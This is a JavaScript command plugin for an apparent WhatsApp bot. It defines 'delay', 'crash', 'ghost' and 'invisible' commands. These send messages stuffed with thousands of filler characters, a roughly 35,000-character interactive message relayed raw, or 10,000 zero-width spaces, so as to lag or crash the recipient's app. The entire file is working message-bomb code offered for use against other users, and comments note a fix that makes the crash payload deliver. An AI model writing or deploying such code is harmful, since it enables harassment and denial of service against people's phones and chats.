const { cmd } = require('../command');

cmd({
    pattern: "delay",
    alias: ["lag"],
    desc: "Send delay bug",
    category: "other",
    react: "🐢",
    filename: __filename
},
async (conn, m, { from }) => {
    let text = 'ㅤ'.repeat(4000); 
    await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘' });
});

cmd({
    pattern: "crash",
    alias: ["crashbug"],
    desc: "Send crash bug",
    category: "other",
    react: "💣",
    filename: __filename
},
async (conn, m, { from }) => {
    // FIX: relayMessage 3rd param {} empty karala
    const crash = {
        interactiveMessage: {
            body: { text: "𝐑𝐈𝐊𝐀 ".repeat(2500) }, // ~35k chars
            nativeFlowMessage: { buttons: [] }
        }
    };
    await conn.relayMessage(from, crash, {}); // <-- mehema witharai
});

cmd({
    pattern: "ghost",
    alias: ["ghostbug"],
    desc: "Send ghost text",
    category: "other",
    react: "👻",
    filename: __filename
},
async (conn, m, { from }) => {
    for(let i = 0; i < 5; i++) {
        await conn.sendMessage(from, { text: 'ㅤ' });
    }
});

cmd({
    pattern: "invisible",
    alias: ["invisiblebug", "blank"],
    desc: "Send invisible bug",
    category: "other",
    react: "🫥",
    filename: __filename
},
async (conn, m, { from }) => {
    await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
});
